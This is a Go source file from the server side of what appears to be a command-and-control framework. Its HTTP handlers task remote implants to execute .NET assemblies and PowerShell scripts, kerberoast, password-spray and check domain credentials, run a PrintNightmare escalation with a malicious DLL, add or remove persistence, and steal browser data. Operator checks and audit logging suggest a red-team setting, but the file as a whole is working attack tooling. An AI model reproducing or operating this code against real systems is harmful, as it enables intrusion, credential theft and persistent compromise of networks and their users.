package server

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"net/http"
	"strings"

	"github.com/gin-gonic/gin"
)

// ── Credential access: assembly, kerberoast, spray, check, persistence ─────

// ── execute-assembly: Upload and execute .NET assembly ─────────────────────
func (s *Server) handleExecuteAssembly(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	filename, b64Data, size, ok := s.handleFileUpload(c, "assembly")
	if !ok {
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "execute_assembly", Data: b64Data})
	if task == nil {
		return
	}
	slog.Info("Execute-assembly requested", "agent_id", id, "assembly", filename, "size", size)
	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", filename, size), true, nil)
	s.dispatchTask(c, task, "execute_assembly", filename)
}

// handleInjectMethods was removed. It advertised a static technique list that
// no client fetched; injection is issued through POST /agents/:id/inject via
// the generic agent-command builder, and the implant side resolves the method
// name itself.

// ── kerberoast: Request TGS hashes for all SPNs ────────────────────────────
func (s *Server) handleKerberoast(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kerberoast", "kerberoast", "Kerberoast requested"})
}

func (s *Server) handlePasswordSpray(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	password := c.PostForm("password")
	domain := c.PostForm("domain")
	dc := c.PostForm("dc")
	delayMs := c.PostForm("delay_ms")
	usernames := c.PostForm("usernames")

	if password == "" {
		respondError(c, http.StatusBadRequest, "password is required")
		return
	}
	if domain == "" {
		respondError(c, http.StatusBadRequest, "domain is required")
		return
	}
	if usernames == "" {
		respondError(c, http.StatusBadRequest, "usernames list is required")
		return
	}
	// The wire format is password|domain|dc|delay, and the implant splits it on
	// '|'. A separator inside any one field shifts the rest: a password such as
	// "pa|ss" makes the implant read the domain as "ss" and spray the WRONG
	// domain, which can lock out accounts in it. Refuse instead of building a
	// task that silently means something else.
	for name, value := range map[string]string{"password": password, "domain": domain, "dc": dc, "delay_ms": delayMs} {
		if strings.ContainsRune(value, '|') {
			respondError(c, http.StatusBadRequest, name+" must not contain '|'")
			return
		}
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	cmd := password + "|" + domain + "|" + dc + "|" + delayMs
	task := s.issueAgentTask(c, id, TaskSpec{Type: "password_spray", Command: cmd, Data: usernames})
	if task == nil {
		return
	}

	userLines := strings.Split(usernames, "\n")
	userCount := 0
	for _, u := range userLines {
		if strings.TrimSpace(u) != "" {
			userCount++
		}
	}

	detail := fmt.Sprintf("Password spray: domain=%s users=%d delay=%sms", domain, userCount, delayMs)
	slog.Info("Password spray requested", "agent_id", id, "domain", domain, "users", userCount)
	s.LogAuditRecord(c, "password_spray", "agent", id, detail, true, nil)
	s.dispatchTask(c, task, "password_spray", detail)
}

// handleCredCheck queues a single-credential validation task. The password
// never appears in audit or logs; dispatch is refused with 429 when the
// per-(agent,domain) fuse is tripped.
func (s *Server) handleCredCheck(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	user := strings.TrimSpace(c.PostForm("user"))
	domain := strings.TrimSpace(c.PostForm("domain"))
	password := c.PostForm("password")
	dc := strings.TrimSpace(c.PostForm("dc"))

	if user == "" || domain == "" || password == "" {
		respondError(c, http.StatusBadRequest, "user, domain and password are required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	if s.credCheckFuse.tripped(id, domain) {
		slog.Warn("Credential check blocked by fuse", "agent_id", id, "domain", domain)
		respondError(c, http.StatusTooManyRequests, "fuse_tripped")
		return
	}

	cmd := user + "|" + domain + "|" + password + "|" + dc
	task := s.issueAgentTask(c, id, TaskSpec{Type: "cred_check", Command: cmd})
	if task == nil {
		return
	}

	detail := fmt.Sprintf("Credential check: %s@%s", user, domain)
	slog.Info("Credential check requested", "agent_id", id, "user", user, "domain", domain)
	s.LogAuditRecord(c, "cred_check", "agent", id, detail, true, nil)
	s.dispatchTask(c, task, "cred_check", detail)
}

// ── elevate_printnightmare: PrintNightmare exploit ─────────────────────────
func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	dllPath := c.PostForm("dll_path")
	if dllPath == "" {
		respondError(c, http.StatusBadRequest, "dll_path is required (upload a malicious DLL first via File Browser)")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "elevate_printnightmare", Command: dllPath})
	if task == nil {
		return
	}
	slog.Info("PrintNightmare exploit requested", "agent_id", id, "dll", dllPath)
	s.LogAuditRecord(c, "elevate_printnightmare", "agent", id, fmt.Sprintf("PrintNightmare DLL: %s", dllPath), true, nil)
	s.dispatchTask(c, task, "elevate_printnightmare", dllPath)
}

// ── Persistence Toolkit ────────────────────────────────────────────────────
func (s *Server) handlePersistence(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	action := c.PostForm("action")
	method := c.PostForm("method")
	binaryPath := c.PostForm("binary_path")

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	switch action {
	case "add":
		if method == "" {
			respondError(c, http.StatusBadRequest, "method is required")
			return
		}
		cmd := method + "|" + binaryPath
		task := s.issueAgentTask(c, id, TaskSpec{Type: "persistence_add", Command: cmd})
		if task == nil {
			return
		}
		slog.Info("Persistence add requested", "agent_id", id, "method", method)
		s.LogAuditRecord(c, "persistence_add", "agent", id, "Persistence add: "+method, true, nil)
		s.dispatchTask(c, task, "persistence_add", method)

	case "list":
		task := s.issueAgentTask(c, id, TaskSpec{Type: "persistence_list"})
		if task == nil {
			return
		}
		slog.Info("Persistence list requested", "agent_id", id)
		s.LogAuditRecord(c, "persistence_list", "agent", id, "Persistence list", true, nil)
		s.dispatchTask(c, task, "persistence_list", "list")

	case "remove":
		if method == "" {
			respondError(c, http.StatusBadRequest, "method is required")
			return
		}
		cmd := method + "|" + binaryPath
		task := s.issueAgentTask(c, id, TaskSpec{Type: "persistence_remove", Command: cmd})
		if task == nil {
			return
		}
		slog.Info("Persistence remove requested", "agent_id", id, "method", method)
		s.LogAuditRecord(c, "persistence_remove", "agent", id, "Persistence remove: "+method, true, nil)
		s.dispatchTask(c, task, "persistence_remove", method)

	default:
		respondError(c, http.StatusBadRequest, "invalid action: must be add, list, or remove")
	}
}

// ── PowerPick: Execute PowerShell script in-process ────────────────────────
func (s *Server) handlePowerPick(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	script := c.PostForm("script")
	if script == "" {
		script = c.PostForm("command")
	}
	if script == "" {
		respondError(c, http.StatusBadRequest, "script is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	b64Script := base64.StdEncoding.EncodeToString([]byte(script))
	task := s.issueAgentTask(c, id, TaskSpec{Type: "powerpick", Command: b64Script})
	if task == nil {
		return
	}

	slog.Info("PowerPick requested", "agent_id", id, "script_len", len(script))
	s.LogAuditRecord(c, "powerpick", "agent", id, fmt.Sprintf("PowerPick script (%d bytes)", len(script)), true, nil)
	s.dispatchTask(c, task, "powerpick", fmt.Sprintf("PowerPick (%d bytes)", len(script)))
}

// ── Browser Data Theft ─────────────────────────────────────────────────────
func (s *Server) handleBrowserSteal(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType:      "browser_steal",
		audit:         "browser_steal",
		defaultValue:  "all",
		auditDetailFn: func(val string) string { return "Browser steal: " + val },
	})
}
